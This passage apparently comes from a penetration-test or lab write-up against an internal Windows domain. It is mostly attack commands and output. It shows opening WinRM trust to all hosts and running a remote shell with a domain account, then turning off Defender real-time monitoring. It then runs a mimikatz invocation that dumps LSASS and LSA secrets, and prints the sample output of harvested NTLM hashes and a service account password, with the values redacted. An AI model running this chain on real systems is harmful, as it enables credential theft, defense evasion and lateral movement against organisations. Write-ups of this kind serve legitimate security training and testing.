```powershell
# FROM MSP-SQLREPORT
winrm set winrm/config/client '@{TrustedHosts="*"}'
winrs -r:10.200.8.75 -u:msp\mspdb -p:"REDACTED_SECRET" cmd
```

## ATTACK CHAIN

Temporary Defender disable → LSASS dump via mimikatz → NTLM hash + cleartext password for `batchsvc` → valid authentication to `INTERNAL-BATCH` → initial access with an account that is a member of `Account Operators` (identity management capabilities in `internalmsp`)

## EXPLOITATION

#### 1. Temporarily Disable Defender

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

#### 2. Credential Dump from LSASS

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "lsadump::secrets" "exit"

# Username : Administrator
# Domain   : INTERNAL-SRV06
# NTLM     : REDACTED_HASH
# Username : INTERNAL-SRV06$
# Domain   : INTERNALMSP
# NTLM     : REDACTED_HASH
# Username : batchsvc
# Domain   : INTERNALMSP
# NTLM     : REDACTED_HASH

mimikatz(commandline) # lsadump::secrets
# internalmsp\batchsvc:REDACTED_SECRET
```

#### 3. Restore Defender

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```
